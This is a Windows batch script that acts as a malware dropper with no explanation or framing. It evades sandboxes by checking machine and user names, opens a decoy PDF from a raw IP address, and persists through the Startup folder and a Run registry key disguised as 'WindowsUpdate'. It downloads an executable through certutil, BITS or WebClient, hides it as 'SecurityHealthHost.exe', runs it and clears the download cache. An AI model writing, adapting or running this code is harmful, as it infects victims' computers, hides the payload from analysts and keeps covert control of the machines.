@echo off
setlocal EnableDelayedExpansion

set "destDir=%LOCALAPPDATA%\WindowsUpdate"
if not exist "!destDir!" mkdir "!destDir!"
set "payload=!destDir!\SecurityHealthHost.exe"
set "scriptName=%~nx0"
set "url=https://github.com/flexbusiness31-design/x/raw/refs/heads/main/ddv2.exe"
set "decoy=http://195.85.207.158/a.pdf"

for %%a in (john sandbox virus sample bruno vmware vbox any.run) do (
    echo %COMPUTERNAME% %USERNAME% | findstr /I "%%a" >nul && exit /b
)

start /min "" "%decoy%"

if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%scriptName%" (
    copy /y "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%scriptName%" >nul 2>&1
)

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdate" /t REG_SZ /d "\"%~f0\"" /f >nul 2>&1
certutil.exe -urlcache -split -f "!url!" "!payload!" >nul 2>&1

if not exist "!payload!" (
    powershell -W Hidden -Command "Start-BitsTransfer -Source '!url!' -Destination '!payload!' -Priority High" >nul 2>&1
)

if not exist "!payload!" (
    powershell -W Hidden -Command "(New-Object Net.WebClient).DownloadFile('!url!', '!payload!')" >nul 2>&1
)

if exist "!payload!" (
    attrib +h +s "!payload!"
    start "" /B "!payload!"
)

certutil.exe -urlcache -f "!url!" delete >nul 2>&1
cls
exit
